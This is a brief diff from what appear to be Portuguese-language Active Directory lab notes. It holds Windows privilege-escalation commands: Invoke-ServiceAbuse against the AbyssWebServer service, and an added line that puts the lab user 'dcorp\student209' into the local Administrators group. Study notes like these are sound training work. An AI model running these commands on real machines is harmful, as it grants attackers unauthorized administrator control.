@@ -2615,4 +2615,5 @@ ADICIONAR MEU USUARIO AO GUPO DE ADMINISTRADORES LOCAIS (FAZER LOGOFF E LOGON DE
 Invoke-ServiceAbuse -Name AbyssWebServer -Username dcorp\student209
 Invoke-ServiceAbuse -Name AbyssWebServer -Username dcorp\student209 -Verbose
 net localgroup administrators
+net localgroup Administrators dcorp\student209 /add
 ```
